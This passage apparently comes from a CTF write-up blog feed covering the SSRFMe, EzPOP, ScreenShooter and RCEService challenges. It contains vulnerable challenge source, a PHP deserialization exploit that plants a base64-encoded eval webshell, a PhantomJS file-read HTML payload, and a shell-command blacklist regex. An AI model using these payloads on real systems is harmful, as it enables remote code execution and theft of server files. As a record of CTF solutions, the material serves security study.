            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span> 
        <span class="token keyword">return</span> result 

    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span> 
            <span class="token keyword">return</span> <span class="token boolean">True</span> 
        <span class="token keyword">else</span><span class="token punctuation">:</span> 
            <span class="token keyword">return</span> <span class="token boolean">False</span> 

<span class="token comment" spellcheck="true">#generate Sign For Action Scan. @app.route("/geneSign", methods=['GET', 'POST'])</span>
<span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    action <span class="token operator">=</span> <span class="token string">"scan"</span> 
    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span> 

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
<span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr 
    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span> 
    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span> 
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> 

<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span> 
    <span class="token keyword">except</span><span class="token punctuation">:</span> 
        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span> 

<span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> 

<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> 

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span> 
        <span class="token keyword">return</span> <span class="token boolean">False</span> 

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> 
    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span> 
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="/2021/07/01/de1ctf-2019-ssrfme/image-20210708101543887.png" alt="image-20210708101543887"></p>
<p>ddb9a99ee5bc0c633c83429eaa500fd7</p>
<p><img src="/2021/07/01/de1ctf-2019-ssrfme/image-20210708101628948.png" alt="image-20210708101628948"></p>
<p>c41a6ae35d06f1fcf3fd74ff476257a1</p>
<p><img src="/2021/07/01/de1ctf-2019-ssrfme/image-20210708102212134.png" alt="image-20210708102212134"></p>
]]></content>
  </entry>
  <entry>
    <title>ELS：2019-EzPOP</title>
    <url>/2021/10/06/els-2019-ezpop/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token string">'path'</span><span class="token punctuation">,</span> <span class="token string">'dirname'</span><span class="token punctuation">,</span> <span class="token string">'basename'</span><span class="token punctuation">,</span> <span class="token string">'extension'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">,</span>
            <span class="token string">'size'</span><span class="token punctuation">,</span> <span class="token string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string">'visibility'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>

    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> int <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">// 创建失败</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">//数据压缩</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$data</span> <span class="token operator">=</span> "<span class="token delimiter">&lt;?php</span>\<span class="token package">n</span><span class="token comment" spellcheck="true">//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>exp:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string">'exp.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$options</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=";</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'strval'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string">'2'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>pop链</tag>
      </tags>
  </entry>
  <entry>
    <title>FireshellCTF:2020-ScreenShooter</title>
    <url>/2021/08/02/fireshellctf-2020-screenshooter/</url>
    <content><![CDATA[<p><img src="/2021/08/02/fireshellctf-2020-screenshooter/image-20210803213632789.png" alt="image-20210803213632789"></p>
<p>只有一个功能点，对输入的URL进行访问，然后返回截图。</p>
<p>比如输入百度的URL就会返回它的截图</p>
<p>既然是访问了这个URL，那就生成个URL让它访问，看一下返回的信息</p>
<p>在 <a href="https://beeceptor.com/">https://beeceptor.com/</a> 上生成一个临时域名，让这个题目访问，可以看到访问的请求头</p>
<p><img src="/2021/08/02/fireshellctf-2020-screenshooter/image-20210803213703993.png" alt="image-20210803213703993"></p>
<p>在标题中我们可以清楚看到使用PhantomJS</p>
<blockquote>
<p>Phantom JS是一个服务器端的 JavaScript API 的 WebKit。其支持各种Web标准： DOM 处理, CSS 选择器, JSON, Canvas, 和 SVG说白了就是一个爬虫，用来爬取网页</p>
</blockquote>
<p>说白了就是一个爬虫，用来爬取网页</p>
<p>搜索PhatomJS发现存在任意文件上传漏洞CVE-2019-17221</p>
<p><img src="/2021/08/02/fireshellctf-2020-screenshooter/image-20210803213751146.png" alt="image-20210803213751146"></p>
<p>该漏洞通过file://URL的XMLHttpRequest触发</p>
<p>exp:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;link rel="attachment" href="file:///flag"&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>让题目访问 http://服务器地址/index.html 即可</p>
]]></content>
  </entry>
  <entry>
    <title>FBCTF:2019-RCEService</title>
    <url>/2021/07/28/fbctf-2019-rceservice/</url>
    <content><![CDATA[<p><img src="/2021/07/28/fbctf-2019-rceservice/image-20210728182037204.png" alt="image-20210728182037204"></p>
<pre><code>{"cmd":"ls"}</code></pre>
<p><img src="/2021/07/28/fbctf-2019-rceservice/image-20210728182059096.png" alt="image-20210728182059096"></p>
<p>源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
